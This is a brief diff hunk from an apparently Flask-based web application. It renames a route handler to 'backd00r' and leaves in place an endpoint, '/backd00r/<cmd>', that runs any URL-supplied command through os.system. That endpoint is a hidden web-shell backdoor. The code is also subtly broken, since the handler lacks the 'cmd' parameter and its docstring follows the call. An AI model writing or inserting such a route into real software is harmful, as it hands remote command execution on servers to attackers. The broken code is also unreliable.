@@ -221,7 +221,7 @@ def show_landing():
 
 @app.route('/backd00r/<cmd>', methods=['GET'])
 @security
-def dashboard():
+def backd00r():
     os.system(cmd)
     """show the landing page"""
 
